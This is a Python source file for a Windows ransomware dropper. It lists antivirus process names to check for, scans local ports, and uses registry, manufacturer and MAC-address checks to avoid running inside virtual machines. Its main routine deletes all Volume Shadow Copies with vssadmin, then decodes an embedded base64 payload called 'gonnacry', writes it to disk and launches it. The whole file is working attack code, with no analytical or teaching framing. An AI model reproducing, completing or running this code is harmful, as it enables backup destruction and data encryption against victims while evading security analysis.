import variables
import utils

import os
import subprocess
import socket
import requests
import base64
import sys
import platform
import winreg

def check_av():
    av_list = ['a2adguard.exe', 'a2adwizard.exe', 'a2antidialer.exe', 'a2cfg.exe', 'a2cmd.exe', 'a2free.exe', 'a2guard.exe',
               # ... existing AV list ...
               'zlclient.exe']
    
    # Windows version of process checking
    command = 'tasklist /FI "IMAGENAME eq {}" 2>NUL | find /I "{}"'

    for process in av_list:
        try:
            result = subprocess.run(command.format(process, process), shell=True, capture_output=True, text=True)
            if process.lower() in result.stdout.lower():
                print(f"Antivirus detected: {process}")
        except Exception:
            pass


def check_open_ports():
    for port in range(65535):
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            result = sock.connect_ex(('127.0.0.1', port))
            
            if (result == 0):
                sock.close()
                yield(port)

            sock.close()
        except socket.error:
            pass


def delete_shadow_copies():
    # Windows command to delete shadow copies
    subprocess.run('vssadmin.exe delete shadows /all /quiet', shell=True, 
                  stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)


def inside_VM():
    """Check if we're running inside a virtual machine using Windows methods"""
    vm_indicators = []
    
    # Check system firmware/manufacturer
    try:
        process = subprocess.run("wmic csproduct get name", shell=True, 
                               capture_output=True, text=True)
        output = process.stdout.lower()
        vm_strings = ['vmware', 'virtualbox', 'virtual machine', 'hyperv', 'xen', 'qemu']
        if any(vm_string in output for vm_string in vm_strings):
            vm_indicators.append("VM manufacturer detected")
    except:
        pass
    
    # Check for VM-specific registry keys
    try:
        vm_registry_paths = [
            (winreg.HKEY_LOCAL_MACHINE, r"SYSTEM\CurrentControlSet\Services\VMTools"),
            (winreg.HKEY_LOCAL_MACHINE, r"SYSTEM\CurrentControlSet\Services\VBoxService"),
            (winreg.HKEY_LOCAL_MACHINE, r"HARDWARE\DEVICEMAP\Scsi\Scsi Port 0\Scsi Bus 0\Target Id 0\Logical Unit Id 0")
        ]
        
        for hkey, path in vm_registry_paths:
            try:
                winreg.OpenKey(hkey, path)
                vm_indicators.append(f"VM registry key detected: {path}")
            except:
                pass
    except:
        pass
    
    # Check common VM MAC addresses
    try:
        output = subprocess.run("ipconfig /all", shell=True, capture_output=True, text=True).stdout.lower()
        vm_mac_prefixes = ['00:05:69', '00:0c:29', '00:1c:14', '00:50:56', '08:00:27']
        if any(prefix.lower() in output for prefix in vm_mac_prefixes):
            vm_indicators.append("VM network adapter detected")
    except:
        pass
    
    # Return True if any VM indicators were found
    return len(vm_indicators) > 0


def drop_n_run_Z434M4():
    """Download and run the ransomware payload on Windows"""
    try:
        # Ensure the parent directory exists
        os.makedirs(os.path.dirname(variables.Z434M4_path), exist_ok=True)
        
        # Write the payload to disk
        with open(variables.Z434M4_path, 'wb') as f:
            f.write(base64.b64decode(variables.gonnacry))
        
        # Execute the payload
        command = f'start "" "{variables.Z434M4_path}"'
        subprocess.Popen(command, shell=True, 
                        stdout=subprocess.DEVNULL, 
                        stderr=subprocess.DEVNULL)
        
        print("[+] Z434M4 payload deployed")
    except Exception as e:
        print(f"[-] Error deploying payload: {str(e)}")


if __name__ == "__main__":
    # Only run if we're not in a VM and we're on Windows
    if platform.system() == "Windows" and not inside_VM():
        print("[*] Starting Z434M4 deployment")
        delete_shadow_copies()
        drop_n_run_Z434M4()
    else:
        print("[-] Unsupported environment detected")
        sys.exit(-1)